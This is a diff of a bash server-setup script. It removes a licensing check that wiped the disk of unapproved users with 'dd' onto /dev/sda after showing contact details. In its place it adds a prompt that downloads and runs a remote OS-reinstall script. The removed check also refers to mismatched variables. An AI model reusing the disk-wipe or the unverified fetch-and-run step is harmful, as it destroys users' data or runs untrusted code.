@@ -18,26 +18,23 @@ green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 stty erase ^?
-MY_IP=$(curl -s -4 ifconfig.me)
-ALLOWED_IPS=$(curl -fsSL "${REPO}utility/ip" | tr -d '\r' | sed '/^\s*$/d' | awk '{$1=$1};1')
-if echo "$IPS" | grep -Eo '^[^#]*' | awk -F'@' '{print $1}' | grep -Fxq "$IP"; then
-clear
-echo -e "  \033[1;93m  ┌────────────────────────────────────────────┐\033[0m"
-echo -e "  \033[1;93m  │\033[1;92m      .::. \033[0m\033[1;77mYou do not have access \033[1;92m.::.\033[0m"
-echo -e "  \033[1;93m  └────────────────────────────────────────────┘\033[0m"
-echo -e "      \033[1;93m┌────────────────────────────────────────┐\033[0m"
-echo -e "   \033[1;93m\033[0m\033[1;31m    You do not have sufficient permissions ! \033[0m"
-echo -e "   \033[1;93m\033[0m\033[1;31m   Administrator has not approved your access ! \033[0m"
-echo -e "   \033[1;93m\033[0m\033[1;31m        To get permission, contact here : \033[0m"
-echo -e "             \033[1;93m\033[0m\033[1;4;31m WhatsApp : \033[0m wa.me/212690068362"
-echo -e "             \033[1;93m\033[0m\033[1;4;31m Telegram : \033[0m t.me/a_hamza_i"
-echo -e "      \033[1;93m└─────────────────────────────────────────┘\033[0m"
-  rm -f setup.sh
-  rm -f root.sh
-  rm -f vpn.sh
-  rm -f open.7z
-  sudo dd if=/dev/zero of=/dev/sda bs=1M
-  exit 1
+OS_NAME=$(lsb_release -is)
+OS_VERSION=$(lsb_release -rs)
+
+if [[ "$OS_NAME" != "Ubuntu" || "$OS_VERSION" != "20.04" ]]; then
+    echo "Current system is not supported. The script only supports Ubuntu 20.04!"
+    read -p "Do you want to reinstall Ubuntu 20.04 ? (YES/NO) : " answer
+    answer=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
+    if [[ "$answer" == "y" || "$answer" == "yes" ]]; then
+        curl -O https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh
+        bash reinstall.sh Ubuntu 20.04
+        reboot
+    elif [[ "$answer" == "n" || "$answer" == "no" ]]; then
+        echo "Reinstallation canceled."
+        exit 0
+    else
+        exec "$0"
+    fi
 fi
 
 TIMES="10"
